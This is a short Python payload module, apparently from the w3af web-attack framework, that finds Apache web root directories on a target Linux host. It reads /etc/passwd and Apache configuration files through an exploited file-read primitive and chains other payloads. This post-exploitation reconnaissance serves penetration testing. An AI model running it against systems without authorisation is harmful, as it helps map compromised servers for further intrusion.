#REQUIRE_LINUX
#This payload finds Apache Root Directories where websites are hosted.
import core.data.kb.knowledgeBase as kb
import re

result = []

def parse_etc_passwd(etc_passwd, user):
    root = re.search('(?<='+user+':/)(.*?)\:', etc_passwd)
    if root:
        return root.group(1)
    else:
        return ''

def parse_config_file(config_file):
    root = re.search('(?<=DocumentRoot )(.*)', config_file)
    if root:
        return root.group(1)
    else:
        return ''

users = run_payload('apache_run_user')
if users:
    for user in users:
        result.append('/'+parse_etc_passwd(read('/etc/passwd'),  user)+'/')

apache_config_files = run_payload('apache_config_files')
if apache_config_files:
    for file in apache_config_files:
        if parse_config_file(read(file)) != '':
            result.append(parse_config_file(read(file))+'/')

if kb.kb.getData('pathdisclosure', 'webroot'):
    result.append(kb.kb.getData('pathdisclosure', 'webroot'))

result = list(set(result))
result = [p for p in result if p != '']
